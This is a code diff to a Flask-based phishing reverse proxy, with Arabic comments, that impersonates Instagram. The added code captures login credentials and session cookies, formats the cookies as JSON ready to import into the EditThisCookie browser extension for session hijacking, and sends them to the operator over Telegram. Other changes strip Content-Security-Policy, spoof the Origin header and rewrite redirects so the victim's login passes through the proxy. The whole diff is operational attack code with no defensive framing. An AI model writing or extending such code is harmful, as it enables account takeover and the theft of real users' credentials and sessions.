@@ -131,6 +131,34 @@ class PhishletEngine:
             logging.info(f"Credentials captured: {found}")
         return found
 
+    # ======================== إرسال الكوكيز بتنسيق EditThisCookie ========================
+    def send_cookies_as_edit_this_cookie(self, cookies_dict, current_host, username="Unknown"):
+        """إرسال الكوكيز بصيغة JSON جاهزة للاستيراد في إضافة EditThisCookie"""
+        cookie_json = []
+        # نحدد النطاق الأساسي للكوكيز (مشتق من target_domain)
+        domain = f".{self.target_domain.split('.')[-2]}.{self.target_domain.split('.')[-1]}"  # e.g., .instagram.com
+        
+        for name, value in cookies_dict.items():
+            cookie_json.append({
+                "domain": domain,
+                "name": name,
+                "value": value,
+                "path": "/",
+                "secure": True,
+                "httpOnly": True,  # معظم كوكيز الجلسة تكون HttpOnly
+                "sameSite": "Lax"
+            })
+        
+        formatted_json = json.dumps(cookie_json, indent=2, ensure_ascii=False)
+        msg = (f"🔥 <b>Session Ready to Import (EditThisCookie)</b>\n"
+               f"🎯 <b>Target:</b> {self.name}\n"
+               f"👤 <b>User:</b> {username}\n"
+               f"🕒 <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+               f"<b>📋 Import this JSON into EditThisCookie:</b>\n"
+               f"<pre>{formatted_json}</pre>\n"
+               f"🔗 <b>Dashboard:</b> https://{current_host}/admin/dashboard")
+        self.send_to_telegram(msg)
+
     def capture_full_session(self, cookies_jar, current_host, creds_data=None):
         cookies_dict = requests.utils.dict_from_cookiejar(cookies_jar) if hasattr(cookies_jar, 'get_dict') else {}
         if not cookies_dict:
@@ -149,6 +177,17 @@ class PhishletEngine:
                 'user_agent': request.headers.get('User-Agent')
             }
 
+            # استخراج اسم المستخدم من بيانات الاعتماد إذا كانت موجودة
+            username = "Unknown"
+            if creds_data and 'username' in creds_data:
+                username = creds_data['username']
+            elif 'username' in cookies_dict:
+                username = cookies_dict['username']  # قد تجد في الكوكيز أيضاً
+            
+            # إرسال الكوكيز بتنسيق EditThisCookie
+            self.send_cookies_as_edit_this_cookie(cookies_dict, current_host, username)
+
+            # إرسال رسالة تقليدية تحتوي على عينة من الكوكيز (اختياري)
             sample_items = list(cookies_dict.items())[:10]
             cookie_sample = "\n".join([f"<code>{k}</code>: <code>{v[:50]}...</code>" for k, v in sample_items])
             if len(cookies_dict) > 10:
@@ -178,7 +217,8 @@ class PhishletEngine:
             if isinstance(content, bytes):
                 content = content.decode('utf-8', errors='ignore')
 
-            # قائمة بجميع النطاقات التي قد تظهر في المحتوى (يمكن توسيعها)
+            # قائمة بجميع النطاقات التي قد تظهر في المحتوى
+            # هذه القائمة يجب أن تشمل كل ما هو موجود في proxy_hosts
             all_domains = ['instagram.com', 'cdninstagram.com', 'fbcdn.net']
 
             # استبدال شامل لكل النطاقات
@@ -195,6 +235,9 @@ class PhishletEngine:
 
             # إزالة CSP من meta tags
             content = re.sub(r'<meta[^>]*http-equiv=["\']Content-Security-Policy["\'][^>]*>', '', content)
+
+            # إخفاء رأس CSP في النص (احتياطي)
+            content = content.replace('Content-Security-Policy', 'X-Ignored-CSP')
 
             # حقن JavaScript إذا وجد في ملف YAML
             if self.js_inject and '<head>' in content:
@@ -275,6 +318,7 @@ def proxy(path):
     headers['Host'] = engine.target_domain
     headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
     headers['Referer'] = f"https://{engine.target_domain}/"
+    headers['Origin'] = f"https://{engine.target_domain}"
 
     # التقاط بيانات POST
     captured_creds_data = None
@@ -293,26 +337,32 @@ def proxy(path):
             timeout=30
         )
 
-        # معالجة التوجيهات
+        # ========== معالجة التوجيهات (الجزء الأهم لإكمال تسجيل الدخول) ==========
         if resp.status_code in [301, 302, 303, 307, 308]:
             location = resp.headers.get('Location', '')
             if location:
+                # استبدال النطاق الأصلي بالنطاق الحالي في رابط التوجيه
                 new_location = location
-                # استبدال النطاق الأصلي بالنطاق الحالي
-                for domain in ['instagram.com', 'cdninstagram.com', 'fbcdn.net']:
+                all_domains = ['instagram.com', 'cdninstagram.com', 'fbcdn.net']
+                for domain in all_domains:
                     if domain in new_location:
                         new_location = re.sub(rf'https?://(?:[a-zA-Z0-9-]+\.)*{re.escape(domain)}', f'https://{host}', new_location)
                         break
+                # إنشاء استجابة التوجيه
                 proxy_resp = make_response('', resp.status_code)
                 proxy_resp.headers['Location'] = new_location
-                # نقل الكوكيز
-                for cookie_name, cookie_value in resp.cookies.items():
-                    proxy_resp.set_cookie(cookie_name, cookie_value, domain=host, secure=True, httponly=True, samesite='Lax')
+                
+                # 🔥 التقاط الجلسة من الكوكيز التي أرسلها الموقع الأصلي بعد تسجيل الدخول
                 if resp.cookies:
                     engine.capture_full_session(resp.cookies, host, captured_creds_data)
+                
+                # نقل الكوكيز إلى المتصفح (لإكمال جلسة المستخدم)
+                for cookie_name, cookie_value in resp.cookies.items():
+                    proxy_resp.set_cookie(cookie_name, cookie_value, domain=host, secure=True, httponly=True, samesite='Lax')
+                
                 return proxy_resp
 
-        # معالجة المحتوى العادي
+        # ========== معالجة المحتوى العادي ==========
         content = engine.rewrite_content(resp.content, resp.headers.get('Content-Type', ''), host)
         proxy_resp = make_response(content)
         proxy_resp.status_code = resp.status_code
@@ -324,11 +374,11 @@ def proxy(path):
             if n.lower() not in excluded_headers:
                 proxy_resp.headers[n] = v
 
-        # نقل الكوكيز
+        # نقل الكوكيز إلى المتصفح
         for cookie_name, cookie_value in resp.cookies.items():
             proxy_resp.set_cookie(cookie_name, cookie_value, domain=host, secure=True, httponly=True, samesite='Lax')
 
-        # التقاط الجلسة
+        # 🔥 التقاط الجلسة إذا وجدت كوكيز مهمة (قد تحدث في استجابة غير توجيهية)
         if resp.cookies:
             engine.capture_full_session(resp.cookies, host, captured_creds_data)
 
